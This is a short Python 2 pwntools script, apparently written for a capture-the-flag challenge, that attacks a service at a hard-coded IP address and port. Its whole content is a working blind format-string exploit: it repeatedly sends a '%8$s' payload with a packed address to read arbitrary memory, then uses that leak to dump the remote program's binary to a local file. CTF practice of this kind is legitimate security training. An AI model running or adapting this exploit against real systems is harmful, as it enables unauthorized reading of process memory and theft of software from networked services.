##coding=utf8
from pwn import *

context.log_level = 'debug'
ip = "47.75.182.113"
port = 9999


def leak(addr):
    # leak addr for three times
    num = 0
    while num < 3:
        try:
            print 'leak addr: ' + hex(addr)
            payload = '%00008$s' + 'STARTEND' + p64(addr)
            sh = remote(ip, port)

            if '\x0a' in payload:
                return None
            sh.sendline(payload)
            data = sh.recvuntil('STARTEND', drop=True)
            sh.close()
            return data
        except Exception:
            num += 1
            continue
    return None

def getbinary():
    addr = 0x400000
    f = open('binary', 'w')
    while addr < 0x402000:
        data = leak(addr)
        if data is None:
            f.write('\xff')
            addr += 1
        elif len(data) == 0:
            f.write('\x00')
            addr += 1
        else:
            f.write(data)
            addr += len(data)
    f.close()


if __name__ == "__main__":
    getbinary()
